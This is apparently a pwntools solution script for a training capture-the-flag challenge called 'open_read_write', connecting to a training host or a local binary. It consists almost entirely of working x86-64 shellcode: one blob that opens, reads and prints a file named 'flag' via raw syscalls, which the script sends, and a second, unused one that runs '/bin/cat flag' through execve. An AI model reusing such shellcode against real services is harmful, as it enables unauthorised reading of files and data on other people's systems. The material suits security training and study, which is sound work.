from pwn import *

context.arch = "amd64"

if "REM" in args: 
    r = remote("open-read-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    r = process("./open_read_write")
    #gdb.attach(r)
    #input("wait")


asm_code1 = """
mov rdx, 0x0067616c66
mov rax, 2
push rdx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax
mov rsi, rsp
mov rdx, 100
xor rax, rax
syscall
mov rax, 1
mov rdi, 1
syscall
"""

asm_code2 = """
xor rdi, rdi
push rdi
mov rdi, 0x7461632f6e69622f
push rdi
mov rdi, rsp
mov rsi, 0x0067616c66
push rsi
mov rsi, rsp
xor rdx, rdx
push rdx
push rsi
push rdi
mov rsi, rsp
mov rax, 0x3b
syscall
"""

r.send(asm(asm_code1))


r.interactive()